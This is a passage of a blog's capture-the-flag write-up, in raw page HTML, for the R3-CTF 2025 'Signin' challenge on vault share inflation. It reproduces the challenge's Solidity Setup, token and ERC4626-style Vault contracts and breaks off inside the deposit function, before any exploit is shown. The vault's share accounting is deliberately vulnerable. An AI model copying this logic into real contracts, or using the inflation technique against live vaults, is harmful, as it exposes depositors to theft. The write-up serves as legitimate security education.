(vault.balanceOf(address(this)) >= 500 ether) { 5 revert("Challenge not solved yet"); 6 } 7 solved = true; 8 } Our goal is to make the Setup::isSolved function return true. This function returns true if the solved variable is set to true. We can set solved to true by calling Setup::solve. The Setup::solve function attempts to deposit 999e18 LING tokens into the vault. If, during this deposit, the number of shares received by the Setup contract is less than 500 ether, the solved variable will be set to true.'><meta itemprop=datePublished content="2025-07-16T19:41:06+05:30"><meta itemprop=dateModified content="2025-07-22T23:08:13+05:30"><meta itemprop=wordCount content="1899"><meta itemprop=keywords content="Vault Inflation"><meta property="og:image" content="https://s4bot3ur.github.io/images/logo.png"><meta name=twitter:image content="https://s4bot3ur.github.io/images/logo.png"><meta property="og:image:alt" content="Signin"><meta name=twitter:image:alt content="Signin"><link data-precache rel=stylesheet href="/assets/main/bundle.min.a5fd428d52638e0104c79f2ace101bf527c9a5a5824d56e3b8e2e834da34d6cc.css" integrity="sha256-pf1CjVJjjgEEx58qzhAb9SfJpaWCTVbjuOLoNNo01sw=" crossorigin=anonymous><link data-precache rel=stylesheet href=/assets/viewer/bundle.min.8c1002839fa22c1350d6ae1eef6593120e108f973c41348be9b5065430566aaf.css integrity="sha256-jBACg5+iLBNQ1q4e72WTEg4Qj5c8QTSL6bUGVDBWaq8=" crossorigin=anonymous><html lang=en><head></head><body><script data-goatcounter=https://s4bot3ur.goatcounter.com/count async src=//gc.zgo.at/count.js></script></body></html></head><body><header class="mb-4 sticky-top"><nav class="top-app-bar shadow navbar navbar-expand-xxl"><div class=container><a class="navbar-brand d-flex align-items-center flex-grow-1 flex-xxl-grow-0 justify-content-xxl-start ms-2 ms-xxl-0 mx-auto me-xxl-2" href=https://s4bot3ur.github.io/><picture><img class=logo alt=Logo src="https://s4bot3ur.github.io/images/logo.webp?v=9f103176f1a34038dc9b17c233d400ef" loading=lazy width=400 height=400>
+</picture>S4b03ur's Website</a><div class="offcanvas-xxl offcanvas-end flex-grow-1" data-bs-scroll=true tabindex=-1 id=navbarMenus aria-labelledby=navbarMenusLabel><div class="offcanvas-header px-4 pb-0"><div class="offcanvas-title h5" id=navbarMenusLabel>S4b03ur's Website</div><button type=button class="btn-close btn-close-white" data-bs-dismiss=offcanvas data-bs-target=#navbarMenus aria-label=Close></button></div><div class="offcanvas-body p-4 pt-0 p-xxl-0"><hr class=d-xxl-none><ul class="navbar-nav flex-row flex-wrap align-items-center me-auto"><li class="nav-item col-6 col-xxl-auto"><a class="nav-link py-2 px-0 px-xxl-2" href=https://s4bot3ur.github.io/><span class="menu-icon me-1"><i class="fa-solid fa-house"></i></span>Home</a></li><li class="nav-item col-12 col-xxl-auto dropdown px-0"><a href=# class="nav-link dropdown-toggle" id=navbarDropdownBlog role=button data-bs-toggle=dropdown aria-expanded=false><span class="menu-icon me-1"><i class="fas fa-blog"></i></span>Blog</a><ul class="dropdown-menu dropdown-menu-end" aria-labelledby=navbarDropdownBlog data-bs-popper=none><li><a class="dropdown-item d-flex align-items-center text-wrap text-xxl-nowrap" href=https://s4bot3ur.github.io/categories/><span class="dropdown-item-icon me-2 p-2 rounded"><i class="fa-solid fa-folder" style=color:#0581e6></i></span><div class=dropdown-item-content><p class="dropdown-item-title mb-0">Categories</p></div></a></li><li><a class="dropdown-item d-flex align-items-center text-wrap text-xxl-nowrap" href=https://s4bot3ur.github.io/series/><span class="dropdown-item-icon me-2 p-2 rounded"><i class="fas fa-book" style=color:#ff5733></i></span><div class=dropdown-item-content><p class="dropdown-item-title mb-0">Series</p></div></a></li><li><a class="dropdown-item d-flex align-items-center text-wrap text-xxl-nowrap" href=https://s4bot3ur.github.io/tags/><span class="dropdown-item-icon me-2 p-2 rounded"><i class="fa-solid fa-tags" style=color:#b197fc></i></span><div class=dropdown-item-content><p class="dropdown-item-title mb-0">Tags</p></div></a></li></ul></li></ul><hr class=d-xxl-none><form class="search-bar ms-auto my-auto" action=/search/ novalidate><div class="input-group align-items-center"><span class="btn btn-search disabled position-absolute left-0 border-0 px-1"><i class="fas fa-fw fa-search fa-lg"></i>
+</span><input class="my-1 form-control border-white rounded-5 search-input bg-body" name=q type=search placeholder=Search aria-label=Search required>
+<span class="search-shortcut position-absolute end-0 top-0 me-2"><kbd class="text-dark bg-white opacity-75 rounded-3 shadow border border-primary py-1 fw-bold">/</kbd></span></div></form><hr class=d-xxl-none><ul class="navbar-nav flex-row flex-wrap align-items-center ms-md-auto"><li class="nav-item dropdown col-6 col-xxl-auto"><a class="nav-link px-0 py-2 px-xxl-1" href=# id=fontSizeDropdown role=button data-bs-toggle=dropdown aria-expanded=false><i class="fas fa-fw fa-font"></i>
+<span class=d-xxl-none>Font Size</span></a><ul class="font-size-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby=fontSizeDropdown><li><button class="font-size-item dropdown-item" data-size=xs>
+Extra Small</button></li><li><button class="font-size-item dropdown-item" data-size=sm>
+Small</button></li><li><button class="font-size-item dropdown-item active" data-size=md>
+Medium</button></li><li><button class="font-size-item dropdown-item" data-size=lg>
+Large</button></li><li><button class="font-size-item dropdown-item" data-size=xl>
+Extra Large</button></li></ul></li><li class="nav-item dropdown col-6 col-xxl-auto"><a class="nav-link px-0 py-2 px-xxl-1" href=# id=paletteDropdown role=button data-bs-toggle=dropdown aria-expanded=false><i class="fas fa-fw fa-palette"></i>
+<span class=d-xxl-none>Palette</span></a><ul class="palette-dropdown-menu dropdown-menu dropdown-menu-end px-2 row g-2" aria-labelledby=paletteDropdown><li class="col-4 my-1"><a role=button id=palette-blue aria-label=Blue class="btn btn-sm w-100 palette text-bg-blue" data-palette=blue></a></li><li class="col-4 my-1"><a role=button id=palette-blue-gray aria-label="Blue Gray" class="btn btn-sm w-100 palette text-bg-blue-gray" data-palette=blue-gray></a></li><li class="col-4 my-1"><a role=button id=palette-brown aria-label=Brown class="btn btn-sm w-100 palette text-bg-brown" data-palette=brown></a></li><li class="col-4 my-1"><a role=button id=palette-cyan aria-label=Cyan class="btn btn-sm w-100 palette text-bg-cyan" data-palette=cyan></a></li><li class="col-4 my-1"><a role=button id=palette-green aria-label=Green class="btn btn-sm w-100 palette text-bg-green" data-palette=green></a></li><li class="col-4 my-1"><a role=button id=palette-indigo aria-label=Indigo class="btn btn-sm w-100 palette text-bg-indigo" data-palette=indigo></a></li><li class="col-4 my-1"><a role=button id=palette-orange aria-label=Orange class="btn btn-sm w-100 palette text-bg-orange" data-palette=orange></a></li><li class="col-4 my-1"><a role=button id=palette-pink aria-label=Pink class="btn btn-sm w-100 palette text-bg-pink" data-palette=pink></a></li><li class="col-4 my-1"><a role=button id=palette-purple aria-label=Purple class="btn btn-sm w-100 palette text-bg-purple" data-palette=purple></a></li><li class="col-4 my-1"><a role=button id=palette-red aria-label=Red class="btn btn-sm w-100 palette text-bg-red" data-palette=red></a></li><li class="col-4 my-1"><a role=button id=palette-teal aria-label=Teal class="btn btn-sm w-100 palette text-bg-teal" data-palette=teal></a></li><li class="col-4 my-1"><a role=button id=palette-yellow aria-label=Yellow class="btn btn-sm w-100 palette text-bg-yellow" data-palette=yellow></a></li></ul></li><li class="nav-item dropdown col-6 col-xxl-auto"><a class="nav-link px-0 py-2 px-xxl-1" href=# id=modeDropdown role=button data-bs-toggle=dropdown aria-expanded=false><i class="mode-icon fas fa-fw fa-adjust" id=modeIcon></i>
+<span class=d-xxl-none>Mode</span></a><ul class="mode-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby=modeDropdown><li class=mode-item data-color-mode=light data-icon=sun><button class=dropdown-item>
+<i class="mode-icon fas fa-fw fa-sun"></i> Light</button></li><li class=mode-item data-color-mode=dark data-icon=moon><button class=dropdown-item>
+<i class="mode-icon fas fa-fw fa-moon"></i> Dark</button></li><li class="mode-item active" data-color-mode=auto data-icon=adjust><button class=dropdown-item>
+<i class="mode-icon fas fa-fw fa-adjust"></i> Auto</button></li></ul></li></ul></div></div><div class=d-flex><button class="navbar-toggler order-5 border-0" type=button data-bs-toggle=offcanvas data-bs-target=#navbarMenus aria-controls=navbarMenus aria-expanded=false aria-label="Toggle navigation">
+<i class="fas fa-ellipsis-h"></i></button></div></div></nav></header><main class="container has-sidebar" data-kind=page><script data-precache src=/js/main-init.f131b3003675b524fbeffa5f8c7bbe43d5118e4a90455757e97f9e8ffee990a9.js integrity="sha256-8TGzADZ1tST77/pfjHu+Q9URjkqQRVdX6X+ej/7pkKk=" crossorigin=anonymous></script><div class="row content"><noscript><div class="alert alert-danger" role=alert>Your browser does not support JavaScript.</div></noscript><div class="content-posts col-xxl-8"><div class=container><nav class="row card component" aria-label=breadcrumb><div class="card-body pb-0"><ol class="hbs-breadcrumb breadcrumb flex-nowrap"><li class="breadcrumb-item text-surface"><a href=/>Home</a></li><li class="breadcrumb-item text-surface"><a href>Blogs</a></li><li class="breadcrumb-item active">Signin</li></ol></div></nav><div class="post-panel-wrapper position-relative d-flex justify-content-center"><div class="d-flex flex-row justify-content-center rounded-5 border post-panel position-fixed px-3 py-1 surface shadow-1"><a class="action action-toc d-none d-xxl-block" href=#postTOC role=button title=Contents><i class="fas fa-fw fa-list-alt"></i>
+</a><a class="action action-toc d-block d-xxl-none" href=#post-toc-container role=button title=Contents><i class="fas fa-fw fa-list-alt"></i>
+</a><a class="action action-post-comments" href=#post-comments role=button aria-label=Comments title=Comments><i class="fas fa-fw fa-comments"></i>
+</a><a id=sidebarToggler class="action action-sidebar-toggler d-none d-xxl-block" role=button title="Toggle sidebar"><i class="fas fa-fw fa-expand-alt" data-fa-transform=rotate-45></i></a></div></div><article class="row card component mb-4 post"><div class=card-header><h1 class="card-title post-title my-2">Signin</h1></div><div class=card-body><div class="post-meta mb-3"><span class="post-date me-1 mb-1" title="created on 2025-07-16 14:11:06 +0000 UTC, updated on 2025-07-22 17:38:13 +0000 UTC.">July 16, 2025</span><span class="post-reading-time me-1 mb-1">9 min read</span><a href=/categories/blockchain/ class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
+<i class="fas fa-fw fa-folder me-1"></i>Blockchain</a><a href=/series/r3-ctf-2025/ class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-series">
+<i class="fas fa-fw fa-columns me-1"></i>R3-CTF-2025</a><a href=/tags/vault-inflation/ class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">Vault Inflation</a></div><div class="mt-2 mb-3 d-block d-xxl-none"><h2 class="text-surface mb-3">Contents</h2><div id=post-toc-container></div><hr class=text-secondary></div><div class="post-content mb-3" data-bs-spy=scroll data-bs-target=#TableOfContents tabindex=0><div id=post-content-body><h1 id=writeup-for-signin data-numberify>Writeup for SignIn<a class="anchor ms-1" href=#writeup-for-signin></a></h1><h3 id=challenge-description data-numberify>Challenge Description<a class="anchor ms-1" href=#challenge-description></a></h3><p>In the world of digital currencies, every transaction holds secrets, and every vault has its own story&mldr;</p><p><strong>Author:</strong> zeroc</p><h3 id=the-challenge data-numberify>The Challenge<a class="anchor ms-1" href=#the-challenge></a></h3><p>The below are source contracts</p><ol><li><strong>Setup</strong> contract</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
+</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>20</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 3</span><span class=cl>
+</span></span><span class=line><span class=ln> 4</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>Vault</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;./Vault.sol&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 5</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>LING</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;./LING.sol&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>
+</span></span><span class=line><span class=ln> 7</span><span class=cl><span class=kd>contract</span> <span class=nc>Setup</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 8</span><span class=cl>    <span class=n>Vault</span> <span class=k>public</span> <span class=n>vault</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 9</span><span class=cl>    <span class=n>LING</span> <span class=k>public</span> <span class=n>ling</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>10</span><span class=cl>    <span class=kt>bool</span> <span class=k>public</span> <span class=n>claimed</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>11</span><span class=cl>    <span class=kt>bool</span> <span class=k>public</span> <span class=n>solved</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>12</span><span class=cl>    <span class=kd>constructor</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>13</span><span class=cl>        <span class=n>ling</span> <span class=o>=</span> <span class=k>new</span> <span class=n>LING</span><span class=p>(</span><span class=mi>1000</span> <span class=kc>ether</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>14</span><span class=cl>        <span class=n>vault</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Vault</span><span class=p>(</span><span class=n>ling</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>15</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>16</span><span class=cl>
+</span></span><span class=line><span class=ln>17</span><span class=cl>    <span class=kd>function</span> <span class=nf>claim</span><span class=p>()</span> <span class=k>external</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>18</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>claimed</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>19</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;Already claimed&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>20</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>21</span><span class=cl>        <span class=n>claimed</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>22</span><span class=cl>        <span class=n>ling</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=mi>1</span> <span class=kc>ether</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>23</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>24</span><span class=cl>
+</span></span><span class=line><span class=ln>25</span><span class=cl>    <span class=kd>function</span> <span class=nf>solve</span><span class=p>()</span> <span class=k>external</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>26</span><span class=cl>        <span class=n>ling</span><span class=p>.</span><span class=n>approve</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>vault</span><span class=p>),</span> <span class=mi>999</span> <span class=kc>ether</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>27</span><span class=cl>        <span class=n>vault</span><span class=p>.</span><span class=n>deposit</span><span class=p>(</span><span class=mi>999</span> <span class=kc>ether</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>));</span>
+</span></span><span class=line><span class=ln>28</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>vault</span><span class=p>.</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>))</span> <span class=o>&gt;=</span> <span class=mi>500</span> <span class=kc>ether</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>29</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;Challenge not solved yet&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>30</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>31</span><span class=cl>        <span class=n>solved</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>32</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>33</span><span class=cl>
+</span></span><span class=line><span class=ln>34</span><span class=cl>    <span class=kd>function</span> <span class=nf>isSolved</span><span class=p>()</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>35</span><span class=cl>        <span class=k>return</span> <span class=n>solved</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>36</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>37</span><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><ol start=2><li><strong>LING</strong> contract</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl><span class=c1>//SPDX-License-Identifier:MIT
+</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 3</span><span class=cl>
+</span></span><span class=line><span class=ln> 4</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>ERC20</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;@signin/openzeppelin/contracts/token/ERC20/ERC20.sol&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 5</span><span class=cl>
+</span></span><span class=line><span class=ln> 6</span><span class=cl><span class=kd>contract</span> <span class=nc>LING</span> <span class=k>is</span> <span class=n>ERC20</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 7</span><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>_initialSupply</span><span class=p>)</span> <span class=n>ERC20</span><span class=p>(</span><span class=s>&#34;LING&#34;</span><span class=p>,</span> <span class=s>&#34;LING&#34;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 8</span><span class=cl>        <span class=n>_mint</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>_initialSupply</span><span class=p>);</span>
+</span></span><span class=line><span class=ln> 9</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>10</span><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><ol start=3><li><strong>Vault</strong> contract</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln>  1</span><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
+</span></span></span><span class=line><span class=ln>  2</span><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>20</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>  3</span><span class=cl>
+</span></span><span class=line><span class=ln>  4</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>ERC20</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;@signin/openzeppelin/contracts/token/ERC20/ERC20.sol&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>  5</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>Ownable</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;@signin/openzeppelin/contracts/access/Ownable.sol&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>  6</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>IERC4626</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;@signin/openzeppelin/contracts/interfaces/IERC4626.sol&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>  7</span><span class=cl><span class=kn>import</span> <span class=p>{</span><span class=n>LING</span><span class=p>}</span> <span class=k>from</span> <span class=s>&#34;./LING.sol&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>  8</span><span class=cl>
+</span></span><span class=line><span class=ln>  9</span><span class=cl><span class=kd>contract</span> <span class=nc>Vault</span> <span class=k>is</span> <span class=n>Ownable</span><span class=p>,</span> <span class=n>IERC4626</span><span class=p>,</span> <span class=n>ERC20</span><span class=p>(</span><span class=s>&#34;LING VAULT&#34;</span><span class=p>,</span> <span class=s>&#34;vLING&#34;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 10</span><span class=cl>    <span class=kd>struct</span> <span class=nc>VaultAccount</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 11</span><span class=cl>        <span class=kt>uint256</span> <span class=n>amount</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 12</span><span class=cl>        <span class=kt>uint256</span> <span class=n>shares</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 13</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln> 14</span><span class=cl>
+</span></span><span class=line><span class=ln> 15</span><span class=cl>    <span class=n>VaultAccount</span> <span class=k>public</span> <span class=n>totalAsset</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 16</span><span class=cl>    <span class=n>LING</span> <span class=n>ling</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 17</span><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint256</span><span class=p>)</span> <span class=k>public</span> <span class=n>borrowedAssets</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 18</span><span class=cl>    <span class=kt>uint256</span> <span class=k>public</span> <span class=n>totalBorrowedAssets</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 19</span><span class=cl>
+</span></span><span class=line><span class=ln> 20</span><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=n>LING</span> <span class=n>_ling</span><span class=p>)</span> <span class=n>Ownable</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 21</span><span class=cl>        <span class=n>ling</span> <span class=o>=</span> <span class=n>_ling</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 22</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln> 23</span><span class=cl>
+</span></span><span class=line><span class=ln> 24</span><span class=cl>    <span class=kd>function</span> <span class=nf>asset</span><span class=p>()</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>address</span> <span class=n>assetTokenAddress</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 25</span><span class=cl>        <span class=n>assetTokenAddress</span> <span class=o>=</span> <span class=kt>address</span><span class=p>(</span><span class=n>ling</span><span class=p>);</span>
+</span></span><span class=line><span class=ln> 26</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln> 27</span><span class=cl>
+</span></span><span class=line><span class=ln> 28</span><span class=cl>    <span class=kd>function</span> <span class=nf>totalAssets</span><span class=p>()</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>totalManagedAssets</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 29</span><span class=cl>        <span class=n>totalManagedAssets</span> <span class=o>=</span> <span class=n>totalAsset</span><span class=p>.</span><span class=n>amount</span> <span class=o>-</span> <span class=n>totalBorrowedAssets</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 30</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln> 31</span><span class=cl>
+</span></span><span class=line><span class=ln> 32</span><span class=cl>    <span class=kd>function</span> <span class=nf>convertToShares</span><span class=p>(</span>
+</span></span><span class=line><span class=ln> 33</span><span class=cl>        <span class=kt>uint256</span> <span class=n>assets</span>
+</span></span><span class=line><span class=ln> 34</span><span class=cl>    <span class=p>)</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>shares</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 35</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>totalAsset</span><span class=p>.</span><span class=n>amount</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 36</span><span class=cl>            <span class=n>shares</span> <span class=o>=</span> <span class=n>assets</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 37</span><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 38</span><span class=cl>            <span class=n>shares</span> <span class=o>=</span> <span class=p>(</span><span class=n>assets</span> <span class=o>*</span> <span class=n>totalAsset</span><span class=p>.</span><span class=n>shares</span><span class=p>)</span> <span class=o>/</span> <span class=n>totalAsset</span><span class=p>.</span><span class=n>amount</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 39</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln> 40</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln> 41</span><span class=cl>
+</span></span><span class=line><span class=ln> 42</span><span class=cl>    <span class=kd>function</span> <span class=nf>convertToAssets</span><span class=p>(</span>
+</span></span><span class=line><span class=ln> 43</span><span class=cl>        <span class=kt>uint256</span> <span class=n>shares</span>
+</span></span><span class=line><span class=ln> 44</span><span class=cl>    <span class=p>)</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>assets</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 45</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>totalAsset</span><span class=p>.</span><span class=n>shares</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 46</span><span class=cl>            <span class=n>assets</span> <span class=o>=</span> <span class=n>shares</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 47</span><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 48</span><span class=cl>            <span class=n>assets</span> <span class=o>=</span> <span class=p>(</span><span class=n>shares</span> <span class=o>*</span> <span class=n>totalAsset</span><span class=p>.</span><span class=n>amount</span><span class=p>)</span> <span class=o>/</span> <span class=n>totalAsset</span><span class=p>.</span><span class=n>shares</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 49</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln> 50</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln> 51</span><span class=cl>
+</span></span><span class=line><span class=ln> 52</span><span class=cl>    <span class=kd>function</span> <span class=nf>maxDeposit</span><span class=p>(</span>
+</span></span><span class=line><span class=ln> 53</span><span class=cl>        <span class=kt>address</span> <span class=cm>/* receiver */</span>
+</span></span><span class=line><span class=ln> 54</span><span class=cl>    <span class=p>)</span> <span class=k>public</span> <span class=k>pure</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>maxAssets</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 55</span><span class=cl>        <span class=k>return</span> <span class=nb>type</span><span class=p>(</span><span class=nc>uint256</span><span class=p>).</span><span class=nb>max</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 56</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln> 57</span><span class=cl>
+</span></span><span class=line><span class=ln> 58</span><span class=cl>    <span class=kd>function</span> <span class=nf>previewDeposit</span><span class=p>(</span>
+</span></span><span class=line><span class=ln> 59</span><span class=cl>        <span class=kt>uint256</span> <span class=n>assets</span>
+</span></span><span class=line><span class=ln> 60</span><span class=cl>    <span class=p>)</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>shares</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 61</span><span class=cl>        <span class=n>shares</span> <span class=o>=</span> <span class=n>convertToShares</span><span class=p>(</span><span class=n>assets</span><span class=p>);</span>
+</span></span><span class=line><span class=ln> 62</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln> 63</span><span class=cl>
+</span></span><span class=line><span class=ln> 64</span><span class=cl>    <span class=kd>function</span> <span class=nf>deposit</span><span class=p>(</span>
+</span></span><span class=line><span class=ln> 65</span><span class=cl>        <span class=kt>uint256</span> <span class=n>assets</span><span class=p>,</span>
+</span></span><span class=line><span class=ln> 66</span><span class=cl>        <span class=kt>address</span> <span class=n>receiver</span>
+</span></span><span class=line><span class=ln> 67</span><span class=cl>    <span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 68</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>assets</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 69</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;zero assets&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln> 70</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln> 71</span><span class=cl>        <span class=kt>uint256</span> <span class=n>shares</span> <span class=o>=</span> <span class=n>convertToShares</span><span class=p>(</span><span class=n>assets</span><span class=p>);</span>
+</span></span><span class=line><span class=ln> 72</span><span class=cl>
